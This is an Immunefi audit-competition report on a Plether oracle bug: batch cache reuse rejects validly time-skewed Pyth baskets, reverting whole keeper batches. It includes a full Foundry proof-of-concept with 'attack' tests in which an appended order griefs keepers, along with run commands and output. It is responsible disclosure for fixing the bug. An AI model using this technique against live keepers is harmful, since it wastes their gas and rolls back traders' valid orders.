# \#98695 [SC-Medium] Valid Staggered Pyth Basket Causes Atomic Multi-Order Batch Revert and Keeper Gas Loss

**Submitted on Nov 9th 2026 at 16:14:38 UTC by @OadeHack for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98695
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

Plether's Oracle accepts an otherwise valid six-feed historical Pyth basket whose component prices have slightly different publication timestamps — a state the protocol explicitly tolerates via `maxComponentPublishTimeDivergence` (5 seconds at the deployed configuration). During `OrderRouter.executeOrderBatch`, when the first order's cached basket is reused for a subsequent eligible FIFO order, the reuse path verifies *every stored feed* against the basket's **newest** timestamp (`cache.publishTime`) rather than a timestamp the individual components are actually required to reach. An older — but valid — component is incorrectly rejected with `PletherOracle__StoredFeedBehind`. Because that error escapes the batch Oracle-preparation frame, the **entire batch reverts**, undoing the already-completed execution of the preceding valid order, and the keeper pays for the failed computation without receiving any execution reward.

The attacker is optional. Because the first order writes the staggered publish times into Pyth storage, and reuse then demands every stored feed reach the *maximum*, **a basket with any intra-tolerance skew can never be reused inside a batch** — reuse succeeds only when all six components are perfectly time-aligned. Any keeper running an ordinary inclusive multi-order batch therefore reverts whenever two legitimately-queued orders share a skewed basket, which is the normal state of six asynchronously-published Pyth feeds. A funded trader appending a routine order after a victim's queued order is simply one way to force the condition on demand.

**The defect is not the documented atomic rollback of genuine Oracle failures; it is a false Oracle failure created by an invalid coverage check on data that passed the protocol's own validity rules — removable with a one-line fix.**

The issue is analyzed using the unmodified Router, Oracle, Engine, Pool and Clearinghouse, with the repository's six-feed `MockPyth` fixture. Six Foundry tests pass, including two-actor attack, exact revert, keeper gas accounting, and recovery controls.

## Details

**Affected component:** `packages/perps/src/PletherOracle.sol` — `updateBatchOrderExecutionPrice`, `_resolveHistoricalOrderBasket`, `_requireStoredFeedCoverage`, `_computeBasketPriceFromFeeds` and `_canReuseHistoricalBatchBasket`; call propagation through `packages/perps/src/OrderRouterExecutionSidecar.sol` — `_prepareBatchOracle`.

### 1. A legitimately accepted basket may have asynchronous component timestamps

The six Pyth components are validated as a basket, not required to have identical publish times. `_computeBasketPriceFromFeeds` rejects a basket only when the max/min component gap exceeds `maxComponentPublishTimeDivergence`, and explicitly retains both the newest and oldest component times:

```solidity
if (maxPublishTime > minPublishTime + maxPublishTimeDivergence) {
    revert PletherOracle__PublishTimeDivergence(mode, minPublishTime, maxPublishTime, maxPublishTimeDivergence);
}
// ...
basket.publishTime = uint64(maxPublishTime);
basket.oldestPublishTime = uint64(minPublishTime);
```

At the deployed configuration this tolerance is **5 seconds** (`PletherOracle.sol:90`, `maxComponentPublishTimeDivergence = 5`), and the configuration setter **rejects a zero value** (`PletherOracle.sol:441`). A valid payload can therefore contain five feeds with `publishTime = commitTime + 1` and one feed with `publishTime = commitTime + 2`. The basket is valid; its `publishTime` is `commitTime + 2` while `oldestPublishTime` is `commitTime + 1`. The documented design treats bounded skew as normal: SECURITY.md lists "component publish-time skew limits so a basket cannot mix fresh and stale legs" as a *mitigation*, not a prohibition.

Initial parsing checks each feed against **its own** parsed timestamp, so both values satisfy the source's coverage policy:

```solidity
pyth.updatePriceFeeds{value: pythFee}(pythUpdateData);
for (uint256 i; i < parsedFeeds.length; ++i) {
    _requireStoredFeedCoverage(parsedFeeds[i].id, parsedFeeds[i].price.publishTime);
}
```

Source: [`PletherOracle.sol`, divergence + basket assembly](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L805-L875); [per-feed initial coverage](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L613-L627).

### 2. Cache reuse incorrectly upgrades every feed's requirement to the newest timestamp

After the first order, the Oracle stores `cache.publishTime = maxPublishTime` and `cache.oldestPublishTime = minPublishTime`. When the next FIFO order qualifies for reuse, this branch executes:

```solidity
if (!policy.oracleFrozen && _canReuseHistoricalBatchBasket(request.commitTime, cache)) {
    // Cache contents are caller-supplied; independently prove storage coverage, not price authenticity.
    for (uint256 i; i < pythFeedIds.length; ++i) {
        _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
    }
    basket = BasketPrice({
        price: cache.price,
        confidence: cache.confidence,
        publishTime: cache.publishTime,
        oldestPublishTime: cache.oldestPublishTime,
        pythFee: 0
    });
    reusedBasket = true;
}
```

The check uses `cache.publishTime` (newest component), although the accepted basket guarantees only that each feed reached *its own* parsed time, which can be as old as `cache.oldestPublishTime`. Therefore:

- `storedPublishTime = commitTime + 1` is correct for the older feed;
- `requiredPublishTime = cache.publishTime = commitTime + 2` is wrong for that feed;
- `_requireStoredFeedCoverage` **reverts** with `StoredFeedBehind(feedId, commitTime + 1, commitTime + 2)`.

```solidity
uint256 storedPublishTime = pyth.getPriceUnsafe(feedId).publishTime;
if (storedPublishTime < requiredPublishTime) {
    revert PletherOracle__StoredFeedBehind(feedId, storedPublishTime, requiredPublishTime);
}
```

This is a comparison of the wrong timestamp, not a stale, divergent, malformed or ineligible price feed.

Source: [`PletherOracle.sol`, reuse coverage check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L260-L275); [revert site](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L645-L653); [reuse eligibility](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L974-L991).

### 2a. This is a defect, not the intended "proven coverage"

A reviewer may ask whether the strict `cache.publishTime` check is intentional — the documented reuse property reads "batch execution may reuse a parsed historical basket only for later FIFO orders whose `commitTime` is strictly before the cached tick and falls within its proven coverage." It is not intentional, on four independent grounds:

1. **Inconsistent with the initial path.** The first order checks each feed against its own parsed time (`PletherOracle.sol:625`); reuse checks every feed against the maximum (`:265`). The same data is judged by two different rules.
2. **`oldestPublishTime` is otherwise unused.** The oldest component time is computed (`:875`), carried in the reused basket and the forward cache (`:271`), and gates reuse eligibility (`:982`, where `commitTime >= cache.oldestPublishTime` disqualifies) — yet the one check that re-proves storage coverage ignores it. A retained field that the coverage check refuses to consult indicates the intended lower bound was dropped.
3. **The strict reading nullifies the documented feature.** Reuse eligibility already requires `commitTime < cache.oldestPublishTime`, so the order's `commitTime` is strictly before *every* component's publish time — every feed already covers it. "Proven coverage" is coverage of the order's `commitTime`, which is satisfied. Requiring storage `>= publishTime` instead is a freshness-to-maximum test that no feed but the newest can satisfy immediately after the first order writes the staggered times via `updatePriceFeeds` (`:624`). As a result **a basket with any intra-tolerance skew can never be reused**; reuse only ever succeeds for a perfectly aligned basket. A documented optimization that reverts on the ordinary case is a logic error.
4. **Skew is expected, not forbidden.** `maxComponentPublishTimeDivergence` exists to admit skewed baskets, and SECURITY.md frames bounded skew as a normal, mitigated condition. The correct coverage bound is `cache.oldestPublishTime` (equivalently, `commitTime`), not `cache.publishTime`.

The documented batch-revert limitation (SECURITY.md: "Other Oracle/Pyth preparation failures … revert the complete batch") describes the consequence of *legitimate* Oracle failures. It does not accpet/allow an erroneous revert on valid, previously-accepted data that a one-line change removes.

### 2b. Distinction from known issues

- **Not "Known limitation: live basket component selection."** That limitation concerns a caller selecting signed updates for a *current live* basket (`_acceptedLiveBasket`). This finding is in the historical, delayed-order execution reuse path (`updateBatchOrderExecutionPrice` → `_resolveHistoricalOrderBasket`) — different code, different concern.
- **Not HIGH-1 (Arbitrum/Pyth clock alignment).** HIGH-1 is about committing after observing a price and extracting profit from the fill. This finding involves no price selection and no profit — it is a false revert and a keeper gas loss.
- **Not Cecuro MED-16/LOW-57.** Those concern *using* a stale cached price (a price-correctness issue favorable to a trader). This is the inverse: a *valid* cache is *falsely rejected* (a liveness/gas defect).

### 3. The false failure escapes the Router and reverts valid preceding work

`OrderRouterExecutionSidecar._prepareBatchOracle` invokes `oracle.updateBatchOrderExecutionPrice`. Its `catch` special-cases only `PletherOracle__HistoricalParserFailure` (a 68-byte, two-argument revert payload); the three-argument `StoredFeedBehind` error has a different selector and length and is rethrown unmodified. Oracle preparation happens in the outer batch frame, so that revert undoes the first FIFO order's completed execution and Pyth update, leaves both orders pending, and charges the keeper transaction gas.

```solidity
} catch (bytes memory reason) {
    if (
        reason.length != 68
            || _selector(reason) != IPletherOracle.PletherOracle__HistoricalParserFailure.selector
    ) {
        assembly ("memory-safe") {
            revert(add(reason, 32), mload(reason))
        }
    }
    return (OrderV3Types.PendingReason.OracleFailure, result, state.oracleCache);
}
```

Source: [`OrderRouterExecutionSidecar.sol`, batch processing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L246-L299); [catch and rethrow](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L982-L1029).

## Impact — Medium: Griefing / keeper gas loss

This Matches **Medium** for "Griefing" and "Theft of gas". The primary characterization is griefing / keeper gas loss (the reverted gas is burned by the failed call rather than transferred to anyone); "theft of gas" applies secondarily in that the keeper is made to pay for computation that yields no execution.

**Reachability and capability.** The trigger is a property of normal Pyth data (component skew within the 5-second tolerance), not of attacker-controlled prices. No governance rights, malformed update, or authenticated-price control is required. A permissionless keeper using the ordinary inclusive multi-order endpoint reverts whenever two queued orders share a skewed basket. A funded trader can additionally force the window on demand by appending a routine order after a victim's queued order. A keeper *may* choose single or bounded execution to avoid batching, but cannot know in advance which baskets are skewed, so the only certain avoidance is to abandon inclusive batching entirely — forfeiting the gas optimization the reuse feature exists to provide.

**Measured PoC consequence:**

| Observation | Result |
|---|---:|
| Foundry tests on pinned source | **6 passed, 0 failed** |
| Keeper inclusive two-order batch | **Reverts** with exact `StoredFeedBehind` arguments |
| Measured EVM gas spent by the failed keeper call | **1,801,665 gas** |
| Three independently failed calls | **5,410,964 cumulative gas** |
| Keeper settlement credit on failed batch | **0 USDG** |
| Gas measured for attacker to append the second order | **1,171,314 gas** |
| Victim order after failure | **Still pending; earlier execution rolled back** |
| Both individual/bounded executions with unchanged data | **Succeed** |

These are EVM `gasleft()` call measurements made in a Foundry test, not Arbitrum receipts or fiat gas-loss estimates. The test uses the permitted mock Pyth implementation to produce a structurally valid asynchronous six-feed basket. It does **not** assume an attacker controls authenticated market prices, and does not claim a specific off-chain keeper is guaranteed to choose the vulnerable batch size.

The loss is caused by an implementation bug in batch cache reuse that triggers on ordinary skewed Pyth data: a valid first order is rolled back, the keeper's execution work is unrewarded, and the condition recurs until the keeper changes its execution boundary.

## Recommendation

During cached historical basket reuse, verify storage coverage against the **minimum accepted component timestamp**, not the basket's maximum:

```solidity
for (uint256 i; i < pythFeedIds.length; ++i) {
    _requireStoredFeedCoverage(pythFeedIds[i], cache.oldestPublishTime);
}
```

Retain the invariant `cache.oldestPublishTime <= cache.publishTime` and the existing cache/commit-time eligibility and max-divergence rules. Where stronger per-feed proof is desired, persist and validate each individual component's accepted publish time rather than requiring every feed to reach the maximum. Do not relax signature, age, confidence, or historical-uniqueness checks. Add a regression in which one accepted component publishes one second later and two orders share the reusable basket: the batch must succeed, while genuinely stale or incomplete storage must still fail.

Source to patch: [`PletherOracle.sol`, reuse coverage check](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L262-L266).

## Proof of Concept

## Proof of Concept

The self-contained Solidity test below reproduces the defect in the **unmodified production Router/Oracle/Engine/Pool fixture**. It submits valid orders from two independently funded traders, uses a six-feed basket with a permissible one-second publication spread, asserts the exact `StoredFeedBehind` error and full rollback of the victim's successful first order, measures unsuccessful keeper-call gas and lack of bounty credit, repeats failed attempts, and proves that both orders execute separately with the same payload. It also includes no-attacker and aligned-publication controls.

The only mock is the repository's existing Pyth feed simulator, appropriate because the price-feed infrastructure is outside the audited Solidity scope. The [existing Oracle synchronization fixture](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/shared/OracleSynchronizationTestBase.sol) supplies all other setup and imports. **The new PoC file is local audit code, not a file that exists at the pinned GitHub revision; the GitHub links in this report point to the real upstream production functions and fixture, not a fabricated PoC URL.**

### How to run

From the pinned repository root, create this **single file** and paste the entire Solidity code below into it:

`packages/perps/test/perps/spec/oracle/PletherBatchGriefFinalE2E.t.sol`

The placement is relative to the [existing repository fixture](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/shared/OracleSynchronizationTestBase.sol#L1-L110), so its `../../shared/OracleSynchronizationTestBase.sol` import resolves correctly.

```bash
# Repository root; check the source revision before testing.
git rev-parse HEAD
# Expected: a82d4fefb02768e5b3bddcc97dee371eee24fea8

mkdir -p packages/perps/test/perps/spec/oracle
# Save the Solidity code below as:
# packages/perps/test/perps/spec/oracle/PletherBatchGriefFinalE2E.t.sol

cd packages/perps
FOUNDRY_OFFLINE=true forge test --match-contract '^PletherBatchGriefFinalE2E$' -vvv
```

**Full PoC source — `PletherBatchGriefFinalE2E.t.sol` :**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Run against the original, unchanged perps contracts at
// a82d4fefb02768e5b3bddcc97dee371eee24fea8.
// Uses the repository's own multi-feed MockPyth and full Router/Engine/Pool fixture.
import {OracleSynchronizationTestBase} from "../../shared/OracleSynchronizationTestBase.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract PletherBatchGriefFinalE2E is OracleSynchronizationTestBase {
    // The Pyth updates are valid individually: all six publications lie in the
    // post-commit execution window and their skew is only one second.
    function _staggeredPayload(uint64 commit) internal pure returns (bytes[] memory data) {
        data = _payload(commit + 1, commit);
        MockPyth.FeedUpdate[] memory updates = abi.decode(data[0], (MockPyth.FeedUpdate[]));
        updates[1].price.publishTime = commit + 2;
        data[0] = abi.encode(updates);
    }

    function _enqueueTwo(uint64 commit) internal returns (uint64 firstId, uint64 secondId) {
        assertEq(block.timestamp, commit, "fixture time");
        firstId = _commit(ALICE, 0);
        secondId = _commit(BOB, 0);
        assertEq(uint256(secondId), uint256(firstId) + 1, "consecutive queued orders");
        _advance(commit + 3);
    }

    // Actual vulnerability candidate: a previously successful batch item is
    // entirely rolled back by the second item's cache coverage assertion.
    function test_PoC_StaggeredPublishTimesRevertAndRollBackEntireBatch() public {
        uint64 commit = uint64(block.timestamp);
        (uint64 firstId, uint64 lastId) = _enqueueTwo(commit);
        bytes[] memory data = _staggeredPayload(commit);

        // First feed is t+1 but the basket timestamp is max(t+1,t+2).
        bytes32[] memory ids = _synchronizationFeedIds();
        uint256 pythFeeBefore = address(baseMockPyth).balance;
        uint256 parseCallsBefore = baseMockPyth.parseUniqueCallCount();

        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector,
                ids[0],
                uint256(commit + 1),
                uint256(commit + 2)
            )
        );
        router.executeOrderBatch{value: 2 * FEE}(lastId, data);

        // A revert of the whole batch undoes even the valid first order.
        assertEq(router.nextExecuteId(), firstId, "FIFO head restored");
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        (uint256 sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeA, 0, "valid first opening rolled back");
        assertEq(sizeB, 0, "second opening not executed");
        assertEq(baseMockPyth.parseUniqueCallCount(), parseCallsBefore, "Pyth history parse rolled back");
        assertEq(address(baseMockPyth).balance, pythFeeBefore, "Pyth fee rolled back");
        assertEq(
            uint256(router.lifecycleBook().lifecycleStatus(firstId)),
            uint256(OrderV3Types.LifecycleStatus.Pending),
            "first order remains pending"
        );
    }

    // Negative control: those *same* staggered updates have sufficient proof
    // for each order separately, because no invalid shared-cache check is made.
    function test_Control_IdenticalStaggeredUpdatesWorkIndividually() public {
        uint64 commit = uint64(block.timestamp);
        (uint64 firstId, uint64 lastId) = _enqueueTwo(commit);
        bytes[] memory data = _staggeredPayload(commit);

        router.executeOrder{value: 2 * FEE}(firstId, data);
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        assertEq(sizeA, 10_000e18, "first individual order works");
        assertEq(router.nextExecuteId(), lastId, "next FIFO item ready");

        router.executeOrder{value: 2 * FEE}(lastId, data);
        (uint256 sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeB, 10_000e18, "second individual order works");
        assertEq(router.nextExecuteId(), 0, "queue is emptied");
    }

    // Positive control: reusing a cache works normally when all six published
    // components have *identical* timestamps.
    function test_Control_AlignedPublishTimesAllowFullBatchExecution() public {
        uint64 commit = uint64(block.timestamp);
        (, uint64 lastId) = _enqueueTwo(commit);
        bytes[] memory aligned = _payload(commit + 1, commit);

        OrderV3Types.BatchResult memory result = router.executeOrderBatch{value: 2 * FEE}(lastId, aligned);
        assertEq(result.terminalCount, 2, "both orders execute in the batch");
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        (uint256 sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeA, 10_000e18, "first position exists");
        assertEq(sizeB, 10_000e18, "second position exists");
        assertEq(router.nextExecuteId(), 0, "queue is emptied");
    }

    // -- Final end-to-end adversarial evidence --
    // Alice alone is executable with the identical staggered basket. A second,
    // ordinary trader's order is the sole difference that makes a keeper's
    // inclusive two-order batch revert. This is the no-attacker control.
    function test_Control_VictimAloneStaggeredBatchSucceeds() public {
        uint64 commit = uint64(block.timestamp);
        uint64 firstId = _commit(ALICE, 0);
        _advance(commit + 3);
        bytes[] memory data = _staggeredPayload(commit);
        OrderV3Types.BatchResult memory result = router.executeOrderBatch{value: 2 * FEE}(firstId, data);
        assertEq(result.terminalCount, 1, "victim alone is executed");
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        assertEq(sizeA, 10_000e18, "victim position opened");
        assertEq(router.nextExecuteId(), 0, "no pending head");
    }

    // The full distinct-actor griefing history: Alice queues a valid order,
    // Bob as an unprivileged funded trader appends another valid order within
    // the cache-reuse window; an independent keeper calls the public batch
    // endpoint, burns execution gas, gets no bounty, and cannot finalize even
    // Alice's first order. The same live queue recovers via two bounded batches.
    function test_Attack_AttackerOrderRevertsKeeperBatchButBoundedRecoverySucceeds() public {
        uint64 commit = uint64(block.timestamp);
        uint64 firstId = _commit(ALICE, 0);
        uint256 bobCommitGasStart = gasleft();
        uint64 lastId = _commit(BOB, 0);
        uint256 bobCommitGas = bobCommitGasStart - gasleft();
        assertEq(uint256(lastId), uint256(firstId) + 1, "Bob appends real FIFO order");
        _advance(commit + 3);
        bytes[] memory data = _staggeredPayload(commit);

        uint256 pythFeeBefore = address(baseMockPyth).balance;
        uint256 keeperCreditBefore = clearinghouse.balanceAssets(address(this));
        uint256 keeperGasStart = gasleft();
        (bool succeeded, bytes memory revertData) = address(router).call{value: 2 * FEE}(
            abi.encodeWithSelector(router.executeOrderBatch.selector, lastId, data)
        );
        uint256 failedKeeperGas = keeperGasStart - gasleft();
        assertFalse(succeeded, "batch must revert from the second cached order");
        bytes32[] memory ids = _synchronizationFeedIds();
        bytes memory expected = abi.encodeWithSelector(
            IPletherOracle.PletherOracle__StoredFeedBehind.selector,
            ids[0], uint256(commit + 1), uint256(commit + 2)
        );
        assertEq(revertData, expected, "exact genuine oracle error");
        assertGt(failedKeeperGas, 0, "reverted public call consumed EVM gas");
        assertEq(router.nextExecuteId(), firstId, "victim FIFO head still pending");
        assertEq(clearinghouse.balanceAssets(address(this)), keeperCreditBefore, "keeper got no settlement reward");
        assertEq(address(baseMockPyth).balance, pythFeeBefore, "oracle ETH fees rolled back");
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        (uint256 sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeA, 0, "Alice's otherwise valid order was undone");
        assertEq(sizeB, 0, "Bob's order did not execute");
        assertEq(
            uint256(router.lifecycleBook().lifecycleStatus(firstId)),
            uint256(OrderV3Types.LifecycleStatus.Pending),
            "Alice still has pending order"
        );

        emit log_named_uint("EVIDENCE_attacker_commit_call_gas", bobCommitGas);
        emit log_named_uint("EVIDENCE_failed_keeper_batch_call_gas", failedKeeperGas);

        // The exact same signed-history mock payload successfully executes both
        // queued positions once the keeper avoids using the broken shared cache.
        uint256 boundedGasStart = gasleft();
        OrderV3Types.BatchResult memory first = router.executeOrderBatch{value: 2 * FEE}(firstId, data);
        OrderV3Types.BatchResult memory second = router.executeOrderBatch{value: 2 * FEE}(lastId, data);
        uint256 boundedGas = boundedGasStart - gasleft();
        assertEq(first.terminalCount, 1, "bounded first succeeds");
        assertEq(second.terminalCount, 1, "bounded second succeeds");
        (sizeA,,,,,,) = engine.positions(ALICE);
        (sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeA, 10_000e18, "victim order succeeds unchanged");
        assertEq(sizeB, 10_000e18, "attacker's ordinary order was independently valid");
        assertEq(router.nextExecuteId(), 0, "queue fully drained");
        emit log_named_uint("EVIDENCE_two_bounded_batches_call_gas", boundedGas);
        emit log_named_uint(
            "EVIDENCE_keeper_reward_from_recovery_assets",
            clearinghouse.balanceAssets(address(this)) - keeperCreditBefore
        );
    }

    // A keeper who repeatedly submits the same customary inclusive bound can
    // lose gas more than once. Reverts do not permanently poison storage:
    // after repeated independent blocks, single-item recovery succeeds.
    function test_Attack_RepeatedFailedKeeperBatchesAreRecoverableNotPermanentFreeze() public {
        uint64 commit = uint64(block.timestamp);
        (uint64 firstId, uint64 lastId) = _enqueueTwo(commit);
        bytes[] memory data = _staggeredPayload(commit);
        bytes32[] memory ids = _synchronizationFeedIds();
        bytes memory expected = abi.encodeWithSelector(
            IPletherOracle.PletherOracle__StoredFeedBehind.selector,
            ids[0], uint256(commit + 1), uint256(commit + 2)
        );
        uint256 totalFailedCallGas;
        uint256 pythFeeBefore = address(baseMockPyth).balance;
        for (uint64 offset = 3; offset <= 5; ++offset) {
            _advance(commit + offset);
            uint256 gasStart = gasleft();
            (bool succeeded, bytes memory errorData) = address(router).call{value: 2 * FEE}(
                abi.encodeWithSelector(router.executeOrderBatch.selector, lastId, data)
            );
            totalFailedCallGas += gasStart - gasleft();
            assertFalse(succeeded, "same valid payload must be rejected in batch");
            assertEq(errorData, expected, "expected second-cache coverage failure");
            assertEq(router.nextExecuteId(), firstId, "queue unchanged across failed calls");
            assertEq(address(baseMockPyth).balance, pythFeeBefore, "Pyth fees rolled back");
        }
        emit log_named_uint("EVIDENCE_three_failed_keeper_calls_gas", totalFailedCallGas);
        assertGt(totalFailedCallGas, 0, "failed calls consume gas");
        router.executeOrder{value: 2 * FEE}(firstId, data);
        router.executeOrder{value: 2 * FEE}(lastId, data);
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        (uint256 sizeB,,,,,,) = engine.positions(BOB);
        assertEq(sizeA, 10_000e18, "victim can recover via single execution");
        assertEq(sizeB, 10_000e18, "other order executes independently");
        assertEq(router.nextExecuteId(), 0, "no permanent queue freeze");
    }

}
```

### Expected reproduction

The six tests should all pass. The key assertions establish the precise bug and its controls:

- `test_PoC_StaggeredPublishTimesRevertAndRollBackEntireBatch` — exact typed revert; original valid order still pending; neither trader's position opened; Pyth writes and payments rolled back.
- `test_Control_IdenticalStaggeredUpdatesWorkIndividually` — both orders execute with the unchanged staggered basket when handled separately.
- `test_Control_AlignedPublishTimesAllowFullBatchExecution` — an identical-timestamp basket successfully executes both orders as a batch.
- `test_Control_VictimAloneStaggeredBatchSucceeds` — the first valid order succeeds as a one-order batch without the appended order.
- `test_Attack_AttackerOrderRevertsKeeperBatchButBoundedRecoverySucceeds` — separate funded attacker order; exact error; measured keeper gas; no reward; successful bounded recovery.
- `test_Attack_RepeatedFailedKeeperBatchesAreRecoverableNotPermanentFreeze` — three distinct failed calls consume gas; single-order execution remains functional.

The user-provided local run produced:

```text
Ran 6 tests for test/perps/spec/oracle/PletherBatchGriefFinalE2E.t.sol:PletherBatchGriefFinalE2E
[PASS] test_Attack_AttackerOrderRevertsKeeperBatchButBoundedRecoverySucceeds()
[PASS] test_Attack_RepeatedFailedKeeperBatchesAreRecoverableNotPermanentFreeze()
[PASS] test_Control_AlignedPublishTimesAllowFullBatchExecution()
[PASS] test_Control_IdenticalStaggeredUpdatesWorkIndividually()
[PASS] test_Control_VictimAloneStaggeredBatchSucceeds()
[PASS] test_PoC_StaggeredPublishTimesRevertAndRollBackEntireBatch()
Suite result: ok. 6 passed; 0 failed; 0 skipped
EVIDENCE_attacker_commit_call_gas: 1171314
EVIDENCE_failed_keeper_batch_call_gas: 1801665
EVIDENCE_two_bounded_batches_call_gas: 2836875
EVIDENCE_keeper_reward_from_recovery_assets: 400000
EVIDENCE_three_failed_keeper_calls_gas: 5410964
```

The `400000` recovery credit is denominated in USDG atomic units; it appears only **after successful bounded recovery**, not in the reverted call. The reproducibility evidence is based on the original Foundry log and source-provenance checks at the pinned commit. No changes to in-scope production contracts are required.

Observed result: `6 passed; 0 failed`, with `EVIDENCE_failed_keeper_batch_call_gas: 1801665`, `EVIDENCE_attacker_commit_call_gas: 1171314`, and `EVIDENCE_three_failed_keeper_calls_gas: 5410964`. No changes to in-scope production contracts are required.
